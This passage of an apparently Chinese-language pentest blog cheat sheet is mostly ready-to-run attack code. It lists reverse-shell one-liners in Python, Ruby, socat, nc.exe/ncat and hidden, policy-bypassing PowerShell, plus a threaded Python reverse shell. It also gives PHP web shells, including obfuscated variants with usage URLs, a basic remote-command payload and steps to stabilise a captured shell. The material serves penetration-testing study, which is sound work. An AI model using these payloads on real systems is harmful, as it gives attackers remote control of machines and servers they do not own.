class="language-bash">python3</span></span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python3 -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;cmd&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python3 -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;powershell&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python3 -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;pwsh&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">- python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;cmd&quot;)&#x27;</span><br><span class="line">- python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;powershell&quot;)&#x27;</span><br><span class="line">- python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;pwsh&quot;)&#x27;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Python3 shortest</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;127.0.0.1&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;sh&quot;)&#x27;</span></span><br><span class="line">- python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;127.0.0.1&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line">- python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;127.0.0.1&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;bash&quot;)&#x27;</span></span><br><span class="line">- python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;127.0.0.1&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;127.0.0.1&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;cmd&quot;)&#x27;</span></span><br><span class="line">- python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;127.0.0.1&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;powershell&quot;)&#x27;</span></span><br><span class="line">- python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;127.0.0.1&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;pwsh&quot;)&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Ruby</li>
</ul>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac/windows</span><br><span class="line">- ruby -rsocket -e<span class="string">&#x27;spawn(&quot;sh&quot;,[:in,:out,:err]=&gt;TCPSocket.new(&quot;127.0.0.1&quot;,4444))&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Ruby no sh</li>
</ul>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac/windows</span><br><span class="line">- ruby -rsocket -e<span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;127.0.0.1&quot;,&quot;4444&quot;);loop&#123;c.gets.chomp!;(exit! if $_==&quot;exit&quot;);($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r)&#123;|io|c.print io.read&#125;))rescue c.puts &quot;failed: <span class="subst">#&#123;<span class="variable">$_</span>&#125;</span>&quot;&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>socat</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac/</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:sh</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:/bin/sh</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:bash</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:/bin/bash</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:&#x27;sh&#x27;,pty,stderr,setsid,sigint,sane</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:&#x27;/bin/sh&#x27;,pty,stderr,setsid,sigint,sane</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:&#x27;bash&#x27;,pty,stderr,setsid,sigint,sane</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:&#x27;/bin/bash&#x27;,pty,stderr,setsid,sigint,sane</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:cmd</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:powershell</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:pwsh</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:&#x27;pwsh&#x27;,pty,stderr,setsid,sigint,sane</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:&#x27;cmd&#x27;,pty,stderr,setsid,sigint,sane</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:&#x27;powershell&#x27;,pty,stderr,setsid,sigint,sane</span><br><span class="line"></span><br></pre></td></tr></table></figure>






<h3 id="For-Windows"><a href="#For-Windows" class="headerlink" title="For Windows"></a>For Windows</h3><ul>
<li><p>nc.exe -e</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- nc.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e sh</span><br><span class="line">- nc.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e /bin/sh</span><br><span class="line">- nc.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e bash</span><br><span class="line">- nc.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e /bin/bash</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- nc.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e <span class="built_in">cmd</span></span><br><span class="line">- nc.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e powershell</span><br><span class="line">- nc.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e pwsh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>ncat.exe -e</p>
</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- ncat.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e sh</span><br><span class="line">- ncat.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e /bin/sh</span><br><span class="line">- ncat.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e bash</span><br><span class="line">- ncat.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e /bin/bash</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- ncat.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e <span class="built_in">cmd</span></span><br><span class="line">- ncat.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e powershell</span><br><span class="line">- ncat.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e pwsh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>PowerShell</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac/windows</span><br><span class="line">- powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.<span class="built_in">Net</span>.Sockets.TCPClient(&quot;<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&quot;,<span class="number">4444</span>);$stream = $client.GetStream();[byte[]]$bytes = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;while(($i = $stream.Read($bytes, <span class="number">0</span>, $bytes.Length)) -ne <span class="number">0</span>)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,<span class="number">0</span>, $i);$sendback = (iex $data <span class="number">2</span>&gt;&amp;<span class="number">1</span> | Out-String );$sendback2  = $sendback + &quot;PS &quot; + (pwd).<span class="built_in">Path</span> + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,<span class="number">0</span>,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()</span><br><span class="line">- powershell -nop -c &quot;$client = New-Object System.<span class="built_in">Net</span>.Sockets.TCPClient(&#x27;<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&#x27;,<span class="number">4444</span>);$stream = $client.GetStream();[byte[]]$bytes = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;while(($i = $stream.Read($bytes, <span class="number">0</span>, $bytes.Length)) -ne <span class="number">0</span>)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,<span class="number">0</span>, $i);$sendback = (iex $data <span class="number">2</span>&gt;&amp;<span class="number">1</span> | Out-String );$sendback2 = $sendback + &#x27;PS &#x27; + (pwd).<span class="built_in">Path</span> + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,<span class="number">0</span>,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span><br><span class="line">- powershell -nop -W hidden -noni -ep bypass -c &quot;$TCPClient = New-Object <span class="built_in">Net</span>.Sockets.TCPClient(&#x27;<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&#x27;, <span class="number">4444</span>);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) &#123;[byte[]]$script:Buffer = <span class="number">0</span>..$TCPClient.ReceiveBufferSize | % &#123;<span class="number">0</span>&#125;;$StreamWriter.Write($String + &#x27;SHELL&gt; &#x27;);$StreamWriter.Flush()&#125;WriteToStream &#x27;&#x27;;while(($BytesRead = $NetworkStream.Read($Buffer, <span class="number">0</span>, $Buffer.Length)) -gt <span class="number">0</span>) &#123;$Command = ([text.encoding]::UTF8).GetString($Buffer, <span class="number">0</span>, $BytesRead - <span class="number">1</span>);$Output = try &#123;Invoke-Expression $Command <span class="number">2</span>&gt;&amp;<span class="number">1</span> | Out-String&#125; catch &#123;$_ | Out-String&#125;WriteToStream ($Output)&#125;$StreamWriter.Close()&quot;</span><br><span class="line">- powershell -nop -W hidden -noni -ep bypass -c &quot;$TCPClient = New-Object <span class="built_in">Net</span>.Sockets.TCPClient(&#x27;<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&#x27;, <span class="number">4444</span>);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object <span class="built_in">Net</span>.Security.SslStream($NetworkStream,$false,(&#123;$true&#125; -as [<span class="built_in">Net</span>.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient(&#x27;cloudflare-dns.com&#x27;,$null,$false);<span class="keyword">if</span>(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) &#123;$SslStream.Close();<span class="keyword">exit</span>&#125;$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) &#123;[byte[]]$script:Buffer = <span class="number">0</span>..$TCPClient.ReceiveBufferSize | % &#123;<span class="number">0</span>&#125;;$StreamWriter.Write($String + &#x27;SHELL&gt; &#x27;);$StreamWriter.Flush()&#125;;WriteToStream &#x27;&#x27;;while(($BytesRead = $SslStream.Read($Buffer, <span class="number">0</span>, $Buffer.Length)) -gt <span class="number">0</span>) &#123;$Command = ([text.encoding]::UTF8).GetString($Buffer, <span class="number">0</span>, $BytesRead - <span class="number">1</span>);$Output = try &#123;Invoke-Expression $Command <span class="number">2</span>&gt;&amp;<span class="number">1</span> | Out-String&#125; catch &#123;$_ | Out-String&#125;WriteToStream ($Output)&#125;$StreamWriter.Close()&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Python3 Windows</li>
</ul>
<p>僅需修改 <code>Popen([&quot;sh&quot;]</code>裡面的sh，根據環境使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> os,socket,subprocess,threading;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s2p</span>(<span class="params">s, p</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(data) &gt; <span class="number">0</span>:</span><br><span class="line">            p.stdin.write(data)</span><br><span class="line">            p.stdin.flush()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p2s</span>(<span class="params">s, p</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s.send(p.stdout.read(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">4444</span>))</span><br><span class="line"></span><br><span class="line">p=subprocess.Popen([<span class="string">&quot;sh&quot;</span>], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)</span><br><span class="line"><span class="comment">#p=subprocess.Popen([&quot;/bin/sh&quot;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)</span></span><br><span class="line"><span class="comment">#p=subprocess.Popen([&quot;bash&quot;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)</span></span><br><span class="line"><span class="comment">#p=subprocess.Popen([&quot;/bin/bash&quot;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)</span></span><br><span class="line"><span class="comment">#p=subprocess.Popen([&quot;cmd&quot;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)</span></span><br><span class="line"><span class="comment">#p=subprocess.Popen([&quot;powershell&quot;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)</span></span><br><span class="line"><span class="comment">#p=subprocess.Popen([&quot;pwsh&quot;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)</span></span><br><span class="line"></span><br><span class="line">s2p_thread = threading.Thread(target=s2p, args=[s, p])</span><br><span class="line">s2p_thread.daemon = <span class="literal">True</span></span><br><span class="line">s2p_thread.start()</span><br><span class="line"></span><br><span class="line">p2s_thread = threading.Thread(target=p2s, args=[s, p])</span><br><span class="line">p2s_thread.daemon = <span class="literal">True</span></span><br><span class="line">p2s_thread.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    p.wait()</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    s.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="PHP-Reverse-Shell"><a href="#PHP-Reverse-Shell" class="headerlink" title="PHP Reverse Shell"></a>PHP Reverse Shell</h2><ul>
<li><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">Pentestmonkey’s reverse shell</a><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Basic-RCE"><a href="#Basic-RCE" class="headerlink" title="Basic RCE"></a>Basic RCE</h3><p>成功上傳 payload 後，只需將指令放在變數後面即可</p>
<ul>
<li><code>?cmd= (ex: ?cmd=ls -la&quot;)</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Web-Shell"><a href="#Web-Shell" class="headerlink" title="Web Shell"></a>Web Shell</h3><p>shell:~# 是一個非常基本的單一檔案 PHP shell。<br>當對 PHP 應用程式進行滲透測試時，它可用於在伺服器上快速執行命令</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/flozz/p0wny-shell">https://github.com/flozz/p0wny-shell</a></li>
</ul>
<h3 id="Obfuscated-PHP-Web-Shell"><a href="#Obfuscated-PHP-Web-Shell" class="headerlink" title="Obfuscated PHP Web Shell"></a>Obfuscated PHP Web Shell</h3><ul>
<li>Usage : <a target="_blank" rel="noopener" href="http://target.com/path/to/shell.php?0=command">http://target.com/path/to/shell.php?0=command</a><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_GET</span>[<span class="number">0</span>]`<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li>Usage : curl -X POST <a target="_blank" rel="noopener" href="http://target.com/path/to/shell.php">http://target.com/path/to/shell.php</a> -d “0&#x3D;command”</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_POST</span>[<span class="number">0</span>]`<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Usage :<ul>
<li><a target="_blank" rel="noopener" href="http://target.com/path/to/shell.php?_=command">http://target.com/path/to/shell.php?_=command</a></li>
<li>curl -X POST <a target="_blank" rel="noopener" href="http://target.com/path/to/shell.php">http://target.com/path/to/shell.php</a> -d “_&#x3D;command” ‘</li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span>`&#123;<span class="variable">$_REQUEST</span>[<span class="string">&#x27;_&#x27;</span>]&#125;`<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Usage :<ul>
<li><a target="_blank" rel="noopener" href="http://target.com/path/to/shell.php?0=command">http://target.com/path/to/shell.php?0=command</a></li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span><span class="variable">$_</span>=<span class="string">&quot;&quot;</span>;<span class="variable">$_</span>=<span class="string">&quot;&#x27;&quot;</span> ;<span class="variable">$_</span>=(<span class="variable">$_</span>^<span class="title function_ invoke__">chr</span>(<span class="number">4</span>*<span class="number">4</span>*(<span class="number">5</span>+<span class="number">5</span>)-<span class="number">40</span>)).(<span class="variable">$_</span>^<span class="title function_ invoke__">chr</span>(<span class="number">47</span>+<span class="title function_ invoke__">ord</span>(<span class="number">1</span>==<span class="number">1</span>))).(<span class="variable">$_</span>^<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="string">&#x27;_&#x27;</span>)+<span class="number">3</span>)).(<span class="variable">$_</span>^<span class="title function_ invoke__">chr</span>(((<span class="number">10</span>*<span class="number">10</span>)+(<span class="number">5</span>*<span class="number">3</span>))));<span class="variable">$_</span>=$&#123;<span class="variable">$_</span>&#125;[<span class="string">&#x27;_&#x27;</span>^<span class="string">&#x27;o&#x27;</span>];<span class="keyword">echo</span>`<span class="variable">$_</span>`<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Usage :<ul>
<li><a target="_blank" rel="noopener" href="http://target.com/path/to/shell.php?_=function&__=argument">http://target.com/path/to/shell.php?_=function&amp;__=argument</a></li>
<li><a target="_blank" rel="noopener" href="http://target.com/path/to/shell.php?_=system&__=ls">http://target.com/path/to/shell.php?_=system&amp;__=ls</a></li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$_</span>=<span class="string">&quot;&#123;&quot;</span>; <span class="variable">$_</span>=(<span class="variable">$_</span>^<span class="string">&quot;&lt;&quot;</span>).(<span class="variable">$_</span>^<span class="string">&quot;&gt;;&quot;</span>).(<span class="variable">$_</span>^<span class="string">&quot;/&quot;</span>); <span class="meta">?&gt;</span><span class="meta">&lt;?=</span>$&#123;<span class="string">&#x27;_&#x27;</span>.<span class="variable">$_</span>&#125;[<span class="string">&#x27;_&#x27;</span>]($&#123;<span class="string">&#x27;_&#x27;</span>.<span class="variable">$_</span>&#125;[<span class="string">&#x27;__&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="TTY-Spawn-Shell"><a href="#TTY-Spawn-Shell" class="headerlink" title="TTY Spawn Shell"></a>TTY Spawn Shell</h2><p>以下指令允許您產生 tty shell<br>其中一些取決於系統環境和安裝的軟體套件</p>
<h3 id="All-the-steps-to-stabilize-your-shell"><a href="#All-the-steps-to-stabilize-your-shell" class="headerlink" title="All the steps to stabilize your shell"></a>All the steps to stabilize your shell</h3><ul>
<li>使用 Python 產生功能更好的 bash shell</li>
<li>shell 看起來會更漂亮一些，但仍然無法使用 Tab 自動完成或箭頭鍵操作<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<p>使我們能夠存取術語指令，例如clear</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">export TERM=xterm</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Finally (and most importantly) we will background the shell using <code>Ctrl + Z</code></li>
</ul>
<p>回到終端</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">stty raw -echo; fg</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>它關閉了我們自己的terminal echo，這使我們能夠存取 tab autocompletes、箭頭鍵和 Ctrl + C 來終止進程</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">stty rows 38 columns 116</span><br><span class="line"></span><br></pre></td></tr></table></figure>

      
    </div>
    
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2024/12/21/PWN/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">&lt;</strong>
      <div class="article-nav-title">
        
          Pwn - Unleashing the Power of Exploits
        
      </div>
    </a>
  
  
    <a href="/2024/12/21/Passive_Reconnaissance/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">Passive Reconnaissance</div>
      <strong class="article-nav-caption">&gt;</strong>
    </a>
  
</nav>

  
</article>





</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2025 Noflag
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: false,
		isPost: true,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>